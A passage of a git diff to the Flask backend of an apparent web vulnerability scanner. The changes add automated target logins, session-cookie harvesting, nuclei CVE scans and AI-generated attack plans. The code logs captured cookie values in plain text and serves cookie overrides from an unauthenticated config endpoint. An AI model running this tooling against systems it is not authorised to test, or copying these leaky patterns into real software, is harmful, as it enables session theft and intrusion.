@@ -47,6 +47,18 @@ logging.basicConfig(
 )
 app.logger.addHandler(log_handler)
 
+# Quiet noisy request logs (Werkzeug) unless explicitly debugging HTTP
+try:
+    import os as _os
+    debug_http = bool(app.config.get('debug_http_logs') or _os.environ.get('MODSCAN_DEBUG_HTTP'))
+    if not debug_http:
+        logging.getLogger('werkzeug').setLevel(logging.WARNING)
+        # Quiet common socket servers if present
+        logging.getLogger('engineio').setLevel(logging.WARNING)
+        logging.getLogger('socketio').setLevel(logging.WARNING)
+except Exception:
+    pass
+
 # Security headers middleware
 @app.after_request
 def after_request(response):
@@ -113,14 +125,119 @@ def get_assets_summary():
 @app.route('/api/vulns', methods=['GET'])
 def get_vulns():
     try:
-        manager = AssetManager()
-        search_query = request.args.get('q', '')
+        # Server-side filtering (supports simple KQL)
+        q = (request.args.get('q') or '').strip()
+        kql = (request.args.get('kql') or '').strip()
+        types = (request.args.get('type') or '').strip()
+        severities = (request.args.get('severity') or '').strip()
+        min_conf = request.args.get('min_confidence')
+        since = (request.args.get('since') or '').strip()
+        until = (request.args.get('until') or '').strip()
         page = int(request.args.get('page', 1))
         per_page = int(request.args.get('limit', request.args.get('size', 100)))
-        
         offset = (page - 1) * per_page
-        vulns_data = manager.get_vulnerabilities(search_query, offset, per_page)
-        return jsonify(vulns_data)
+
+        where = []
+        params = []
+        # Minimal KQL: key:value tokens separated by spaces
+        if kql:
+            tokens = [t for t in kql.split() if t.strip()]
+            simple_terms = []
+            for t in tokens:
+                if ':' in t:
+                    key, val = t.split(':', 1)
+                    key = key.lower().strip(); val = val.strip()
+                    if key == 'type' and val:
+                        ts = [x.strip().lower() for x in val.split(',') if x.strip()]
+                        if ts:
+                            placeholders = ','.join('?'*len(ts))
+                            where.append(f"LOWER(v.type) IN ({placeholders})")
+                            params.extend(ts)
+                    elif key in ('sev','severity') and val:
+                        sv = [x.strip().upper() for x in val.split(',') if x.strip()]
+                        if sv:
+                            placeholders = ','.join('?'*len(sv))
+                            where.append(f"UPPER(v.severity) IN ({placeholders})")
+                            params.extend(sv)
+                    elif key in ('conf','confidence') and val:
+                        try:
+                            mc = float(val.replace('>=','').strip())
+                            where.append("v.confidence >= ?")
+                            params.append(mc)
+                        except Exception:
+                            pass
+                    elif key == 'since' and val:
+                        since = val
+                    elif key == 'until' and val:
+                        until = val
+                    elif key == 'url' and val:
+                        where.append("a.url LIKE ?")
+                        params.append(f"%{val}%")
+                    elif key == 'payload' and val:
+                        where.append("v.payload LIKE ?")
+                        params.append(f"%{val}%")
+                    elif key == 'evidence' and val:
+                        where.append("v.evidence LIKE ?")
+                        params.append(f"%{val}%")
+                else:
+                    simple_terms.append(t)
+            if simple_terms:
+                like = '%' + ' '.join(simple_terms) + '%'
+                where.append("(v.description LIKE ? OR v.evidence LIKE ? OR a.url LIKE ?)")
+                params.extend([like, like, like])
+            # Ignore discrete filters when KQL present (they can still be included in KQL)
+            q = ''
+            types = ''
+            severities = ''
+            min_conf = None
+        if q:
+            where.append("(v.description LIKE ? OR v.evidence LIKE ? OR a.url LIKE ?)")
+            likeq = f"%{q}%"; params.extend([likeq, likeq, likeq])
+        if types:
+            ts = [t.strip().lower() for t in types.split(',') if t.strip()]
+            if ts:
+                placeholders = ','.join('?'*len(ts))
+                where.append(f"LOWER(v.type) IN ({placeholders})")
+                params.extend(ts)
+        if severities:
+            sv = [s.strip().upper() for s in severities.split(',') if s.strip()]
+            if sv:
+                placeholders = ','.join('?'*len(sv))
+                where.append(f"UPPER(v.severity) IN ({placeholders})")
+                params.extend(sv)
+        try:
+            if min_conf is not None and min_conf != '':
+                mc = float(min_conf)
+                where.append("v.confidence >= ?")
+                params.append(mc)
+        except Exception:
+            pass
+        import datetime as _dt
+        if since in ('1h','24h','7d'):
+            now = _dt.datetime.utcnow()
+            delta = {'1h': _dt.timedelta(hours=1), '24h': _dt.timedelta(days=1), '7d': _dt.timedelta(days=7)}[since]
+            since_ts = (now - delta).strftime('%Y-%m-%d %H:%M:%S')
+            where.append("v.detected_at >= ?")
+            params.append(since_ts)
+        elif since:
+            where.append("v.detected_at >= ?")
+            params.append(since)
+        if until:
+            where.append("v.detected_at <= ?")
+            params.append(until)
+
+        where_sql = (' WHERE ' + ' AND '.join(where)) if where else ''
+        base = "FROM vulnerabilities v LEFT JOIN assets a ON v.asset_id = a.id"
+        sql_data = f"SELECT v.id, v.type, v.severity, v.confidence, v.description, v.payload, v.evidence, v.detected_at, a.url as asset_url {base} {where_sql} ORDER BY v.detected_at DESC LIMIT ? OFFSET ?"
+        sql_count = f"SELECT COUNT(*) {base} {where_sql}"
+        params_count = list(params)
+        params_data = list(params) + [per_page, offset]
+        with get_db() as db:
+            total = db.execute(sql_count, params_count).fetchone()[0]
+            cur = db.execute(sql_data, params_data)
+            cols = [c[0] for c in cur.description]
+            vulns = [dict(zip(cols, row)) for row in cur.fetchall()]
+        return jsonify({"vulnerabilities": vulns, "total": total, "page": page, "per_page": per_page})
     except Exception as e:
         app.logger.error(f"Error loading vulnerabilities: {e}")
         return jsonify({"vulnerabilities": [], "total": 0, "page": 1, "per_page": 25})
@@ -158,6 +275,19 @@ def get_vulnerability_categories():
     except Exception as e:
         app.logger.error(f"Error getting vulnerability categories: {e}")
         return jsonify({"categories": []})
+
+@app.route('/api/config', methods=['GET'])
+def get_config():
+    """Get relevant configuration settings for frontend."""
+    try:
+        config_settings = {
+            'disable_auth_validation': CONFIG.get('disable_auth_validation', False),
+            'cookie_overrides': CONFIG.get('cookie_overrides', {}),
+        }
+        return jsonify(config_settings)
+    except Exception as e:
+        app.logger.error(f"Error getting config: {e}")
+        return jsonify({'disable_auth_validation': False, 'cookie_overrides': {}})
 
 @app.route('/vuln_test.html')
 def vulnerability_test_page():
@@ -612,6 +742,21 @@ def api_scanner_status():
             cursor = db.execute("SELECT COUNT(*) FROM vulnerabilities WHERE type LIKE '%API%' OR type LIKE '%IDOR%' OR type LIKE '%BOLA%' ")
             api_logic_findings = cursor.fetchone()[0]
         
+        # Detect parallel tools and proxy flags from config/env
+        try:
+            parallel_tools = bool(CONFIG.get('enhanced', {}).get('parallel_tools', True) or os.environ.get('MODSCAN_PARALLEL_TOOLS'))
+        except Exception:
+            parallel_tools = True
+        try:
+            ignore_proxy = bool(CONFIG.get('enhanced', {}).get('ignore_proxy') or os.environ.get('MODSCAN_IGNORE_PROXY'))
+        except Exception:
+            ignore_proxy = False
+        # Determine max_concurrent_tests hint
+        try:
+            max_conc = CONFIG.get('max_concurrent_tests') or 'UNLIMITED'
+        except Exception:
+            max_conc = 'UNLIMITED'
+
         status = {
             'engine': {
                 'running': engine_running,
@@ -649,9 +794,13 @@ def api_scanner_status():
                 'status': 'ANALYZING' if engine_running else 'IDLE'
             },
             'performance': {
-                'max_concurrent': 'UNLIMITED',
+                'max_concurrent': max_conc,
                 'active_sessions': 0,
                 'cpu_usage': int(cpu_percent)
+            },
+            'tools': {
+                'parallel': parallel_tools,
+                'proxy': 'off' if ignore_proxy else 'on'
             }
         }
         
@@ -660,6 +809,51 @@ def api_scanner_status():
     except Exception as e:
         app.logger.error(f"Failed to get scanner status: {e}")
         return jsonify({'error': str(e)}), 500
+
+@app.route('/api/ai-plans', methods=['GET'])
+def api_ai_plans():
+    """Return recent AI plans (phase and Commix) for a given URL or latest overall."""
+    try:
+        url = request.args.get('url', '').strip()
+        limit = int(request.args.get('limit', 5))
+        rows_out = []
+        with get_db() as db:
+            if url:
+                cursor = db.execute(
+                    """
+                    SELECT timestamp, action, target, message, details
+                    FROM activities
+                    WHERE action = 'AI_PLAN' AND target = ?
+                    ORDER BY id DESC
+                    LIMIT ?
+                    """, (url, limit)
+                )
+            else:
+                cursor = db.execute(
+                    """
+                    SELECT timestamp, action, target, message, details
+                    FROM activities
+                    WHERE action = 'AI_PLAN'
+                    ORDER BY id DESC
+                    LIMIT ?
+                    """, (limit,)
+                )
+            for row in cursor.fetchall():
+                rec = dict(zip([col[0] for col in cursor.description], row))
+                # Try to parse JSON details if possible
+                try:
+                    if rec.get('details') and isinstance(rec['details'], str):
+                        # details may be a dict string; best-effort parse
+                        d = rec['details']
+                        if d.strip().startswith('{'):
+                            rec['details_json'] = json.loads(d)
+                except Exception:
+                    pass
+                rows_out.append(rec)
+        return jsonify({ 'plans': rows_out, 'count': len(rows_out) })
+    except Exception as e:
+        app.logger.error(f"Failed to fetch AI plans: {e}")
+        return jsonify({ 'plans': [], 'error': str(e) }), 500
 
 @app.route('/api/findings/advanced', methods=['GET'])
 def api_advanced_findings():
@@ -992,11 +1186,63 @@ def minimize_cookies():
     except Exception as e:
         return jsonify({"success": False, "error": str(e)}), 500
 
-@app.route('/api/notifications', methods=['GET'])  
+@app.route('/api/notifications', methods=['GET'])
 def get_notifications():
+    """Return recent notifications produced by the scanner and subsystems.
+
+    Reads newline-delimited JSON from notifications.jsonl (append-only). This is
+    universal and does not assume any specific target or technology.
+    """
     try:
-        # Return empty for now - notifications system placeholder
-        return jsonify({"notifications": []})
+        from pathlib import Path
+        import json
+        base_dir = Path(__file__).resolve().parent
+        path = base_dir / 'notifications.jsonl'
+        items = []
+        if path.exists():
+            # Check file size and truncate if too large (prevent endless notifications)
+            try:
+                if path.stat().st_size > 10 * 1024 * 1024:  # 10MB limit
+                    app.logger.info("Truncating large notifications file")
+                    path.unlink()  # Delete oversized file
+                    return jsonify([])  # Return empty notifications
+            except Exception:
+                pass
+            
+            # Read last ~200 lines efficiently with time filtering
+            try:
+                import time
+                current_time = int(time.time())
+                max_age_seconds = 3600  # Only show notifications from last hour
+                cutoff_time = current_time - max_age_seconds
+                
+                with open(path, 'r', encoding='utf-8') as fp:
+                    for line in fp.readlines()[-200:]:
+                        line = line.strip()
+                        if not line:
+                            continue
+                        try:
+                            evt = json.loads(line)
+                            # Filter out old notifications (older than 1 hour)
+                            evt_timestamp = evt.get('ts', 0)
+                            if evt_timestamp < cutoff_time:
+                                continue
+                                
+                            # Attach stable id if missing
+                            if 'id' not in evt:
+                                try:
+                                    import hashlib as _hl
+                                    basis = f"{evt.get('ts','')}-{evt.get('message','')}-{json.dumps(evt.get('payload',{}), sort_keys=True)}"
+                                    evt['id'] = _hl.sha1(basis.encode('utf-8', errors='ignore')).hexdigest()[:16]
+                                except Exception:
+                                    evt['id'] = str(evt.get('ts',''))
+                            items.append(evt)
+                        except Exception:
+                            continue
+            except Exception as e:
+                app.logger.error(f"Notifications read error: {e}")
+        # Newest last; frontend can poll every few seconds
+        return jsonify({"notifications": items})
     except Exception as e:
         app.logger.error(f"Error getting notifications: {e}")
         return jsonify({"notifications": []})
@@ -1093,91 +1339,239 @@ def extract_cookies():
 
 @app.route('/api/login-extract-cookies', methods=['POST'])
 def login_extract_cookies():
-    """Login with credentials and extract session cookies"""
+    """Login with credentials and extract session cookies (universal).
+
+    - Parses the login form to preserve CSRF/hidden fields
+    - Detects username/password inputs heuristically
+    - Submits to resolved form action, falling back to provided URL
+    - Returns raw cookie string exactly as set by the target
+    """
     try:
         import asyncio
         import aiohttp
-        from urllib.parse import urljoin, urlparse
+        from urllib.parse import urljoin, urlparse, urlunparse
         import re
-        
+
         data = request.get_json()
-        login_url = data.get('login_url')
-        username = data.get('username')
-        password = data.get('password')
-        
-        if not all([login_url, username, password]):
+        login_url = (data.get('login_url') or '').strip()
+        username = (data.get('username') or '').strip()
+        password = data.get('password') or ''
+
+        if not login_url or not username or not password:
             return jsonify({"success": False, "error": "All fields are required"}), 400
-        
-        app.logger.info(f"Attempting login to {login_url} with username {username}")
-        
+
+        app.logger.info(f"Attempting login to {login_url} as '{username}' (universal parser)")
+
+        # Heuristics for username/password field detection
+        def _pick_user_field(inputs: dict) -> str:
+            candidates = []
+            for name, meta in inputs.items():
+                m = meta[0] if isinstance(meta, list) and meta else meta
+                n = (name or '').lower()
+                t = (m.get('type') if isinstance(m, dict) else '') or ''
+                if 'user' in n or 'email' in n or 'login' in n or t in ('text', 'email'):
+                    candidates.append(name)
+            # Prefer explicit username-like names
+            for k in candidates:
+                kl = k.lower()
+                if 'user' in kl or 'login' in kl: return k
+            for k in candidates:
+                if 'email' in k.lower(): return k
+            return candidates[0] if candidates else ''
+
+        def _pick_pass_field(inputs: dict) -> str:
+            for name, meta in inputs.items():
+                m = meta[0] if isinstance(meta, list) and meta else meta
+                n = (name or '').lower()
+                t = (m.get('type') if isinstance(m, dict) else '') or ''
+                if t == 'password' or 'pass' in n:
+                    return name
+            return ''
+
         async def perform_login():
             jar = aiohttp.CookieJar(unsafe=True)
             async with aiohttp.ClientSession(cookie_jar=jar) as session:
-                # Step 1: Get login page to extract CSRF tokens
-                async with session.get(login_url) as response:
-                    login_html = await response.text()
-                    app.logger.info(f"Login page status: {response.status}")
-                
-                # Step 2: Extract CSRF token if present
-                csrf_token = None
-                if 'user_token' in login_html:
-                    token_match = re.search(r'name=["\']user_token["\'] value=["\']([^"\']+)["\']', login_html)
-                    if token_match:
-                        csrf_token = token_match.group(1)
-                        app.logger.info("Found CSRF token")
-                
-                # Step 3: Prepare login data
-                login_data = {
-                    'username': username,
-                    'password': password,
-                    'Login': 'Login'
-                }
-                if csrf_token:
-                    login_data['user_token'] = csrf_token
-                
-                # Step 4: Perform login
-                async with session.post(login_url, data=login_data, allow_redirects=False) as response:
-                    app.logger.info(f"Login attempt status: {response.status}")
-                    
-                    # Check if we got a redirect (successful login) or 200
-                    if response.status in [200, 302, 303]:
-        # Extract all cookies from the session
-                        all_cookies = []
-                        for cookie in session.cookie_jar:
-                            all_cookies.append(f"{cookie.key}={cookie.value}")
-                        
-                        app.logger.info(f"Found {len(all_cookies)} cookies: {[c.split('=')[0] for c in all_cookies]}")
-                        
-                        if all_cookies:
-                            cookie_string = "; ".join(all_cookies)
-                            
-                            # Test the cookies by accessing the same origin root
-                            from urllib.parse import urlparse, urlunparse
-                            u = urlparse(login_url)
-                            test_url = urlunparse((u.scheme, u.netloc, '/', '', '', ''))
-                            async with session.get(test_url) as test_response:
-                                test_content = await test_response.text()
-                                if test_response.status in (200, 301, 302):
-                                    app.logger.info("Authentication verified - can access protected pages")
-                                else:
-                                    app.logger.warning("Authentication may have failed - redirected to login")
-                            
-                            return {"success": True, "cookie_string": cookie_string}
-                        else:
-                            return {"success": False, "error": "No cookies found after login"}
-                    else:
-                        return {"success": False, "error": f"Login failed with status {response.status}"}
-        
-        # Run the async login function
+                # 1) GET login page
+                async with session.get(login_url, allow_redirects=True) as resp:
+                    html = await resp.text()
+                    base = str(resp.url)
+                    app.logger.info(f"Login page status: {resp.status} @ {base}")
+
+                # 2) Try universal form parse first
+                action_url = login_url
+                form_data = None
+                try:
+                    from modules.universal_form_parser import parse_forms, build_form_data
+                    forms = parse_forms(html, base_url=base)
+                    # Choose form that contains a password field
+                    chosen = None
+                    for f in forms:
+                        for name, meta in f.get('inputs', {}).items():
+                            meta0 = meta[0] if isinstance(meta, list) and meta else meta
+                            if isinstance(meta0, dict) and meta0.get('type', '').lower() == 'password':
+                                chosen = f
+                                break
+                        if chosen:
+                            break
+                    if chosen:
+                        inputs = chosen.get('inputs', {})
+                        # Build preserving hidden/CSRF
+                        form_data = build_form_data(inputs)
+                        u_key = _pick_user_field(inputs)
+                        p_key = _pick_pass_field(inputs)
+                        if u_key:
+                            form_data[u_key] = username
+                        if p_key:
+                            form_data[p_key] = password
+                        # Fallbacks in case detection missed
+                        form_data.setdefault('username', username)
+                        form_data.setdefault('password', password)
+                        # Resolve action URL
+                        action_url = chosen.get('action') or base
+                        if action_url and not urlparse(action_url).scheme:
+                            action_url = urljoin(base, action_url)
+                except Exception as e:
+                    app.logger.info(f"Universal form parser not available or failed: {e}")
+
+                # 3) Generic fallback: include hidden inputs + username/password
+                if form_data is None:
+                    form_data = {}
+                    # Capture all hidden inputs generically
+                    try:
+                        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.I):
+                            tag = m.group(0)
+                            n = re.search(r'name=\s*["\']([^"\']+)["\']', tag, re.I)
+                            v = re.search(r'value=\s*["\']([^"\']*)["\']', tag, re.I)
+                            if n:
+                                form_data[n.group(1)] = v.group(1) if v else ''
+                    except Exception:
+                        pass
+                    # Add generic credential fields
+                    form_data.setdefault('username', username)
+                    form_data.setdefault('password', password)
+                    action_url = login_url
+
+                # 4) POST login
+                async with session.post(action_url, data=form_data, allow_redirects=False) as r2:
+                    app.logger.info(f"Login POST -> {r2.status} @ {action_url}")
+
+                # 5) Collect cookies
+                keys = []
+                parts = []
+                for c in session.cookie_jar:
+                    if c.key and (c.value is not None):
+                        keys.append(c.key)
+                        parts.append(f"{c.key}={c.value}")
+
+                cookie_string = '; '.join(parts)
+
+                # 6) Probe root of same origin to validate
+                try:
+                    u = urlparse(login_url)
+                    test_url = urlunparse((u.scheme or 'http', u.netloc, '/', '', '', ''))
+                    async with session.get(test_url, allow_redirects=True, timeout=10) as test_resp:
+                        ok = test_resp.status in (200, 301, 302)
+                        app.logger.info(f"Probe {test_url} -> {test_resp.status}")
+                except Exception:
+                    ok = bool(cookie_string)
+
+                if cookie_string:
+                    return {"success": True, "cookie_string": cookie_string, "cookie_keys": keys}
+                return {"success": False, "error": "No cookies found after login", "cookie_keys": keys}
+
         loop = asyncio.new_event_loop()
         asyncio.set_event_loop(loop)
         result = loop.run_until_complete(perform_login())
         loop.close()
-        
+
         return jsonify(result)
-            
+
     except Exception as e:
         app.logger.error(f"Login extraction error: {e}")
+        return jsonify({"success": False, "error": str(e)}), 500
+
+@app.route('/api/extract_cookies_simple', methods=['POST'])
+def extract_cookies_simple():
+    """Simple cookie extraction - just visit URLs and grab any cookies they set"""
+    try:
+        import asyncio
+        import aiohttp
+        
+        data = request.get_json()
+        urls = data.get('urls', [])
+        
+        if not urls:
+            return jsonify({"success": False, "error": "No URLs provided"}), 400
+        
+        async def extract_simple_cookies():
+            all_cookies = {}
+            errors = []
+            
+            async with aiohttp.ClientSession() as session:
+                for url in urls:
+                    try:
+                        url = url.strip()
+                        if not url:
+                            continue
+                            
+                        app.logger.info(f"Extracting cookies from {url}")
+                        async with session.get(url, timeout=15, allow_redirects=True) as response:
+                            app.logger.info(f"Response {response.status} from {url}")
+                            
+                            # Get cookies from this request
+                            cookie_count_before = len(all_cookies)
+                            for cookie in session.cookie_jar:
+                                if cookie.key and cookie.value:
+                                    all_cookies[cookie.key] = cookie.value
+                                    app.logger.info(f"Found cookie: {cookie.key}={cookie.value}")
+                            
+                            if len(all_cookies) == cookie_count_before:
+                                app.logger.info(f"No new cookies found from {url}")
+                                    
+                    except Exception as e:
+                        error_msg = f"Failed to extract cookies from {url}: {e}"
+                        app.logger.warning(error_msg)
+                        errors.append(error_msg)
+                        continue
+            
+            # Convert cookies to string format
+            cookie_parts = []
+            for key, value in all_cookies.items():
+                cookie_parts.append(f"{key}={value}")
+            
+            cookie_string = "; ".join(cookie_parts) if cookie_parts else ""
+            
+            if not cookie_string:
+                if errors:
+                    return {
+                        "success": False, 
+                        "error": f"Connection errors: {'; '.join(errors[:2])}",
+                        "count": 0
+                    }
+                else:
+                    return {
+                        "success": True, 
+                        "cookies": "",
+                        "count": 0,
+                        "message": "No cookies set by these URLs"
+                    }
+            
+            return {
+                "success": True, 
+                "cookies": cookie_string,
+                "count": len(all_cookies)
+            }
+        
+        # Run the async extraction
+        loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(loop)
+        result = loop.run_until_complete(extract_simple_cookies())
+        loop.close()
+        
+        return jsonify(result)
+        
+    except Exception as e:
+        app.logger.error(f"Simple cookie extraction error: {e}")
         return jsonify({"success": False, "error": str(e)}), 500
 
 @app.route('/api/verify_cookie', methods=['POST'])
@@ -1231,11 +1625,19 @@ def verify_cookie():
         
         if ok:
             # Merge persistent policy if present and persist back
+            merged_info = []
             try:
                 with sqlite3.connect(app.config['database_path']) as db:
                     row = db.execute("SELECT persistent FROM cookies WHERE domain=?", (norm_domain,)).fetchone()
                     merged_cookie = cookie_string
                     if row and row[0] and merged_cookie:
+                        # Track which keys are merged for transparency
+                        try:
+                            import json
+                            arr = json.loads(row[0]) if row[0] else []
+                            merged_info = [kv.split('=',1)[0] for kv in arr if isinstance(kv, str) and '=' in kv]
+                        except Exception:
+                            merged_info = []
                         merged_cookie = _merge_persistent_cookie(merged_cookie, row[0])
                     db.execute("INSERT INTO cookies(domain, cookie, last_updated) VALUES(?,?,datetime('now'))\n                               ON CONFLICT(domain) DO UPDATE SET cookie=excluded.cookie, last_updated=excluded.last_updated",
                                (norm_domain, merged_cookie or ''))
@@ -1243,25 +1645,68 @@ def verify_cookie():
                     cookie_string = merged_cookie
             except Exception:
                 pass
-            return jsonify({"success": True, "verified": True, "final_url": final_url, "status": status, "cookie_string": cookie_string, "domain": norm_domain})
+            return jsonify({"success": True, "verified": True, "final_url": final_url, "status": status, "cookie_string": cookie_string, "domain": norm_domain, "merged_persistent_keys": merged_info})
         
-        # Attempt refresh if creds provided
+        # Attempt refresh if creds provided (universal form parsing)
         if login_url and username and password:
             async def _refresh():
                 jar = aiohttp.CookieJar(unsafe=True)
                 async with aiohttp.ClientSession(cookie_jar=jar) as session:
                     async with session.get(login_url) as resp:
                         html = await resp.text()
-                    import re
-                    csrf = None
-                    if 'user_token' in html:
-                        m = re.search(r'name=["\']user_token["\'] value=["\']([^"\']+)["\']', html)
-                        csrf = m.group(1) if m else None
-                    form = {'username': username, 'password': password, 'Login': 'Login'}
-                    if csrf:
-                        form['user_token'] = csrf
-                    async with session.post(login_url, data=form, allow_redirects=False) as r2:
-                        # Build cookie string
+                        base = str(resp.url)
+                    # Try universal form parsing first
+                    action_url = login_url
+                    form = None
+                    try:
+                        from modules.universal_form_parser import parse_forms, build_form_data
+                        forms = parse_forms(html, base_url=base)
+                        chosen = None
+                        for f in forms:
+                            for name, meta in f.get('inputs', {}).items():
+                                m0 = meta[0] if isinstance(meta, list) and meta else meta
+                                if isinstance(m0, dict) and m0.get('type','').lower() == 'password':
+                                    chosen = f
+                                    break
+                            if chosen:
+                                break
+                        if chosen:
+                            inputs = chosen.get('inputs', {})
+                            form = build_form_data(inputs)
+                            # Heuristics to set creds
+                            def _pick_user_field(inputs: dict) -> str:
+                                for nm, md in inputs.items():
+                                    m = md[0] if isinstance(md, list) and md else md
+                                    n = (nm or '').lower(); t = (m.get('type') if isinstance(m, dict) else '') or ''
+                                    if 'user' in n or 'email' in n or 'login' in n or t in ('text','email'):
+                                        return nm
+                                return 'username'
+                            def _pick_pass_field(inputs: dict) -> str:
+                                for nm, md in inputs.items():
+                                    m = md[0] if isinstance(md, list) and md else md
+                                    n = (nm or '').lower(); t = (m.get('type') if isinstance(m, dict) else '') or ''
+                                    if t == 'password' or 'pass' in n:
+                                        return nm
+                                return 'password'
+                            form[_pick_user_field(inputs)] = username
+                            form[_pick_pass_field(inputs)] = password
+                            action_url = chosen.get('action') or base
+                    except Exception:
+                        form = None
+                    # Generic fallback: include hidden inputs + username/password
+                    if form is None:
+                        form = {'username': username, 'password': password}
+                        try:
+                            for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.I):
+                                tag = m.group(0)
+                                n = re.search(r'name=\s*["\']([^"\']+)["\']', tag, re.I)
+                                v = re.search(r'value=\s*["\']([^"\']*)["\']', tag, re.I)
+                                if n:
+                                    form.setdefault(n.group(1), v.group(1) if v else '')
+                        except Exception:
+                            pass
+                        action_url = login_url
+                    async with session.post(action_url, data=form, allow_redirects=False) as r2:
                         parts = []
                         for c in session.cookie_jar:
                             parts.append(f"{c.key}={c.value}")
@@ -1535,6 +1980,37 @@ def serve_evidence(filename):
     except Exception as e:
         return jsonify({'error': str(e)}), 500
 
+# ===== Live Viewer (Latest Screenshot) =====
+
+@app.route('/api/screenshots/latest', methods=['GET'])
+def latest_screenshot():
+    try:
+        import os
+        from pathlib import Path
+        sc_dir = Path('screenshots')
+        if not sc_dir.exists():
+            return jsonify({'error': 'no_screenshots_dir'}), 404
+        files = list(sc_dir.glob('*.png'))
+        if not files:
+            return jsonify({'error': 'no_screenshots'}), 404
+        files.sort(key=lambda f: f.stat().st_mtime, reverse=True)
+        top = files[0]
+        return jsonify({
+            'filename': top.name,
+            'url': f"/api/screenshots/{top.name}",
+            'modified': int(top.stat().st_mtime)
+        })
+    except Exception as e:
+        return jsonify({'error': str(e)}), 500
+
+@app.route('/live')
+def live_view():
+    """Simple live viewer that auto-refreshes the latest screenshot."""
+    try:
+        return render_template('live.html')
+    except Exception as e:
+        return f"Live viewer error: {e}", 500
+
 # ===== Auth Auto-Refresh =====
 
 @app.route('/api/auto_refresh_session', methods=['POST'])
@@ -1576,18 +2052,57 @@ def auto_refresh_session():
             async with aiohttp.ClientSession(cookie_jar=jar) as session:
                 async with session.get(login_url, timeout=15) as r:
                     html = await r.text()
-                csrf = None
-                m = re.search(r'name=["\']user_token["\']\s+value=["\']([^"\']+)["\']', html)
-                if m:
-                    csrf = m.group(1)
-                form = {'username': username, 'password': password}
-                # Try common submit field names
-                for k in ('Login','submit','logon','signin','_submit'):
-                    form.setdefault(k, 'Login')
-                if csrf:
-                    form['user_token'] = csrf
-                async with session.post(login_url, data=form, allow_redirects=True, timeout=20) as r2:
-                    # Build cookie string
+                    base = str(r.url)
+                # Universal form parsing
+                try:
+                    from modules.universal_form_parser import parse_forms, build_form_data
+                    forms = parse_forms(html, base_url=base)
+                except Exception:
+                    forms = []
+                action_url = login_url
+                form = None
+                if forms:
+                    # pick form with password field
+                    for f in forms:
+                        for name, meta in f.get('inputs', {}).items():
+                            m0 = meta[0] if isinstance(meta, list) and meta else meta
+                            if isinstance(m0, dict) and m0.get('type','').lower() == 'password':
+                                form = build_form_data(f.get('inputs', {}))
+                                # heuristics to set creds
+                                def _pick_user_field(inputs: dict) -> str:
+                                    for nm, md in inputs.items():
+                                        mm = md[0] if isinstance(md, list) and md else md
+                                        n = (nm or '').lower(); t = (mm.get('type') if isinstance(mm, dict) else '') or ''
+                                        if 'user' in n or 'email' in n or 'login' in n or t in ('text','email'):
+                                            return nm
+                                    return 'username'
+                                def _pick_pass_field(inputs: dict) -> str:
+                                    for nm, md in inputs.items():
+                                        mm = md[0] if isinstance(md, list) and md else md
+                                        n = (nm or '').lower(); t = (mm.get('type') if isinstance(mm, dict) else '') or ''
+                                        if t == 'password' or 'pass' in n:
+                                            return nm
+                                    return 'password'
+                                inputs = f.get('inputs', {})
+                                form[_pick_user_field(inputs)] = username
+                                form[_pick_pass_field(inputs)] = password
+                                action_url = f.get('action') or base
+                                break
+                        if form:
+                            pass
+                # Generic fallback: collect hidden inputs and set username/password
+                if form is None:
+                    form = {'username': username, 'password': password}
+                    try:
+                        for m in re.finditer(r'<input[^>]*type=["\']hidden["\'][^>]*>', html, re.I):
+                            tag = m.group(0)
+                            n = re.search(r'name=\s*["\']([^"\']+)["\']', tag, re.I)
+                            v = re.search(r'value=\s*["\']([^"\']*)["\']', tag, re.I)
+                            if n:
+                                form.setdefault(n.group(1), v.group(1) if v else '')
+                    except Exception:
+                        pass
+                async with session.post(action_url, data=form, allow_redirects=True, timeout=20) as r2:
                     parts = []
                     for c in session.cookie_jar:
                         parts.append(f"{c.key}={c.value}")
@@ -1782,6 +2297,88 @@ def get_vulnerability_details(vuln_id):
         app.logger.error(f"Error getting vulnerability details: {e}")
         return jsonify({"error": "Failed to load vulnerability details"}), 500
 
+@app.route('/api/assets/<int:asset_id>/cve-candidates', methods=['GET'])
+def get_asset_cve_candidates(asset_id: int):
+    try:
+        mgr = AssetManager()
+        cands = mgr.get_asset_cve_candidates(asset_id, limit=50)
+        return jsonify({ 'asset_id': asset_id, 'candidates': cands, 'total': len(cands) })
+    except Exception as e:
+        return jsonify({ 'error': str(e) }), 500
+
+@app.route('/api/scan/cvefocused', methods=['POST'])
+def run_cve_focused_scan():
+    try:
+        data = request.get_json(force=True) or {}
+        asset_id = int(data.get('asset_id') or 0)
+        if not asset_id:
+            return jsonify({ 'success': False, 'error': 'asset_id required' }), 400
+        mgr = AssetManager()
+        asset = mgr.get_asset_by_id(asset_id)
+        if not asset or not asset.get('url'):
+            return jsonify({ 'success': False, 'error': 'asset not found' }), 404
+        cands = mgr.get_asset_cve_candidates(asset_id, limit=50)
+        cves = [c['cve'] for c in cands if c.get('cve')]
+        if not cves:
+            return jsonify({ 'success': False, 'error': 'no CVE candidates' }), 400
+        # Run nuclei CVE-focused scan inline (timeboxed)
+        import asyncio
+        from modules.nuclei_scanner import NucleiVulnerabilityScanner
+        scanner = NucleiVulnerabilityScanner(mgr, {})
+        async def _go():
+            try:
+                await scanner.scan_urls_by_cves([asset['url']], cves[:20])
+            except Exception:
+                pass
+        try:
+            asyncio.run(asyncio.wait_for(_go(), timeout=60))
+        except Exception:
+            pass
+        return jsonify({ 'success': True, 'started': True, 'cves': cves[:20] })
+    except Exception as e:
+        return jsonify({ 'success': False, 'error': str(e) }), 500
+
+@app.route('/api/vulnerability/<int:vuln_id>/reverify', methods=['POST'])
+def ai_revalidate_vulnerability(vuln_id: int):
+    """Run AI validation (Gemini Flash) for a vulnerability and store verdict.
+
+    Returns { success, verdict?, confidence?, reason? }
+    """
+    try:
+        manager = AssetManager()
+        with manager._get_db() as db:
+            row = db.execute("SELECT id, type, evidence, payload, asset_id FROM vulnerabilities WHERE id=?", (vuln_id,)).fetchone()
+            if not row:
+                return jsonify({"success": False, "error": "not_found"}), 404
+            vuln_type, evidence, payload = row[1], row[2] or '', row[3] or ''
+            # Load config for Gemini key
+            cfg = {}
+            try:
+                with open('config.json','r') as f:
+                    import json as _json
+                    cfg = _json.load(f) or {}
+            except Exception:
+                cfg = {}
+        # Initialize AI engine on demand
+        from modules.ml_vuln_engine import MLVulnerabilityEngine
+        ai = MLVulnerabilityEngine(manager, cfg)
